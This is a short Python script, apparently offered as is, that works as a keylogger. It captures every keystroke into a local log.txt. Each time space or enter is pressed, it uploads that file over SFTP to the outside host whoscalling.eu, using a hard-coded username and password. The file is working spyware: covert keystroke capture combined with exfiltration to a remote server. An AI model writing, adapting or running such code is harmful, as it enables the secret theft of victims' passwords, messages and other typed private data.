import os
import keyboard
import paramiko


def osDetect():

    if os.name == 'nt':

        OS = '\\'
        return OS
    elif os.name == 'posix':

        OS = '/'
        return OS

def outreach():

    ssh = paramiko.SSHClient()
    ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
    ssh.connect('whoscalling.eu', username='log', password='logpass13')
    sftp = ssh.open_sftp()
    sftp.put(f'{os.getcwd()}{osDetect()}log.txt', 'log.txt')
    sftp.close()
    ssh.close()

def keylogger():


    while True:
        file = open('log.txt', 'a')

        event = keyboard.read_event()

        if event.event_type == keyboard.KEY_DOWN:
            char = keyboard.read_key()

            if event.name == 'space':
                char = '\n'
                outreach()
                

            elif event.name == 'enter':
                outreach()

            print(char)
            file.write(char)
            file.close()




if __name__ == '__main__':
    keylogger()
